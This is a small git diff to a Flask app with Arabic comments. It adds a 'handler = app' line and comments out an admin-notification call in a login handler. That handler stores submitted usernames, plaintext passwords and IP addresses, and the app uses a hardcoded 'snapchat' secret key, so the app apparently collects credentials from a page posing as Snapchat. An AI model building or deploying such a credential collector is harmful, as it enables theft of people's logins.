@@ -12,6 +12,7 @@ import threading
 load_dotenv()  # لتحميل متغيرات البيئة من ملف .env
 
 app = Flask(__name__)
+handler = app
 app.secret_key = os.environ.get('SECRET_KEY', 'snapchat-secret-key-2024')
 
 # عملاء صفحة الأدمن المتصلون بالإشعارات
@@ -59,7 +60,6 @@ def admin_notifications():
         }
     )
 	
-
 
 # الاتصال بقاعدة PostgreSQL
 def get_connection():
@@ -124,7 +124,7 @@ def handle_login():
     ''', (username, password, timestamp, ip_address))
     login_id = cursor.fetchone()[0]
     conn.commit()
-	notify_admins()
+#	notify_admins()
     conn.close()
 
     session['username'] = username
